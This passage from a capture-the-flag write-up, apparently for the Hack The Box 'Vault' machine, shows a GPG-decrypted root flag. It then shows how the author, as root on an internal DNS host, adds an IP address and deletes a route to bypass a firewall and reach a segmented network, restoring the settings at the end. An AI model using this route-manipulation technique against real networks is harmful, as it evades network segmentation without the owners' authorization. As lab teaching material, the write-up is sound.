<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre></td><td class="rouge-code"><pre><span class="nv">$ </span>gpg <span class="nt">-d</span> root.txt.gpg
gpg: encrypted with 4096-bit RSA key, ID C778C610D1EB1F03, created 2018-07-24
      <span class="s2">"david &lt;dave@david.com&gt;"</span>
ca468370b91d1f5906e31093d9bfe819
</pre></td></tr></tbody></table></code></pre></div></div>

<p>I could’ve done this on <code class="language-plaintext highlighter-rouge">dave@ubuntu</code>, itself. That would skip the step of importing the <code class="language-plaintext highlighter-rouge">secring.gpg</code></p>

<h1 id="beyond-root">Beyond root</h1>
<h2 id="bypass-firewall-with-misconfigured-routes">Bypass firewall with misconfigured routes</h2>
<p>If you read <a href="https://0xcaretaker.github.io/posts/Vault/#bash_history-file-of-alex">.bash_history file of alex</a>. 
I discarded the idea of getting to <code class="language-plaintext highlighter-rouge">192.168.5.0/24</code> as I cannot make another interface. 
But I can still add another IP address to <code class="language-plaintext highlighter-rouge">ens3</code> adapter.
<a href="https://0xdf.gitlab.io/2019/04/06/htb-vault.html#firewall-bypass">0xdf-Vault</a> explains better.</p>

<p>Since VM’s are setup like this:
<img src="/assets/img/Posts/Vault/Vault-1.png" alt="Vault-1" />
And not like: <img src="/assets/img/Posts/Vault/Vault-2.png" alt="Vault-2" />
I can easily add interface at <code class="language-plaintext highlighter-rouge">DNS</code>.</p>

<h3 id="add-another-ip-to-interface">Add another IP to interface</h3>
<p><a href="https://access.redhat.com/sites/default/files/attachments/rh_ip_command_cheatsheet_1214_jcs_print.pdf">redhat - ip_command_cheatsheet</a> was very useful and lists all commands. You can google “ip addr add” and this link will pop at the top.</p>

<p>With <code class="language-plaintext highlighter-rouge">ip addr</code>:</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre></td><td class="rouge-code"><pre>root@DNS:~# ip addr add 192.168.5.3/24 dev ens3
</pre></td></tr></tbody></table></code></pre></div></div>

<p><code class="language-plaintext highlighter-rouge">/etc/network/interfaces</code> and <code class="language-plaintext highlighter-rouge">route</code> shows that the traffic flows through <code class="language-plaintext highlighter-rouge">192.168.122.5</code> which is firewall.
I can remove that route since I can directly talk to <code class="language-plaintext highlighter-rouge">Vault</code>.</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
</pre></td><td class="rouge-code"><pre>root@DNS:~# route
Kernel IP routing table
Destination     Gateway         Genmask         Flags Metric Ref    Use Iface
192.168.5.0     192.168.122.5   255.255.255.0   UG    0      0        0 ens3
192.168.5.0     <span class="k">*</span>               255.255.255.0   U     0      0        0 ens3
192.168.122.0   <span class="k">*</span>               255.255.255.0   U     0      0        0 ens3
</pre></td></tr></tbody></table></code></pre></div></div>

<p><code class="language-plaintext highlighter-rouge">192.168.5.0 * 255.255.255.0 U 0 0 0 ens3</code> route has been added when I added another IP address <code class="language-plaintext highlighter-rouge">192.168.5.3</code> to <code class="language-plaintext highlighter-rouge">ens3</code> interface.</p>

<h3 id="remove-route-through-firewall">Remove route through firewall</h3>
<p>Earlier routes:</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
</pre></td><td class="rouge-code"><pre>root@DNS:~# route
Kernel IP routing table
Destination     Gateway         Genmask         Flags Metric Ref    Use Iface
192.168.5.0     192.168.122.5   255.255.255.0   UG    0      0        0 ens3
192.168.122.0   <span class="k">*</span>               255.255.255.0   U     0      0        0 ens3
</pre></td></tr></tbody></table></code></pre></div></div>

<p>Deleting routing entry:</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
</pre></td><td class="rouge-code"><pre>root@DNS:~# ip route delete 192.168.5.0/24 via 192.168.122.5
root@DNS:~# route
Kernel IP routing table
Destination     Gateway         Genmask         Flags Metric Ref    Use Iface
192.168.122.0   <span class="k">*</span>               255.255.255.0   U     0      0        0 ens3
</pre></td></tr></tbody></table></code></pre></div></div>

<p>Ping:</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre></td><td class="rouge-code"><pre>root@DNS:~# ping 192.168.5.2
PING 192.168.5.2 <span class="o">(</span>192.168.5.2<span class="o">)</span> 56<span class="o">(</span>84<span class="o">)</span> bytes of data.
64 bytes from 192.168.5.2: <span class="nv">icmp_seq</span><span class="o">=</span>1 <span class="nv">ttl</span><span class="o">=</span>64 <span class="nb">time</span><span class="o">=</span>2.12 ms
64 bytes from 192.168.5.2: <span class="nv">icmp_seq</span><span class="o">=</span>2 <span class="nv">ttl</span><span class="o">=</span>64 <span class="nb">time</span><span class="o">=</span>0.916 ms
</pre></td></tr></tbody></table></code></pre></div></div>

<p>Nmap works without checking for client’s <code class="language-plaintext highlighter-rouge">53/4444</code> as earlier. Which simply means the routes aren’t going through the firewall.</p>

<p>And Remember not to spoil this for others, so :</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre></td><td class="rouge-code"><pre><span class="nv">$ </span>ip addr del 192.168.5.3/24 dev ens3
<span class="nv">$ </span>route add <span class="nt">-net</span> 192.168.5.0 gw 192.168.122.5 netmask 255.255.255.0
</pre></td></tr></tbody></table></code></pre></div></div>

:ET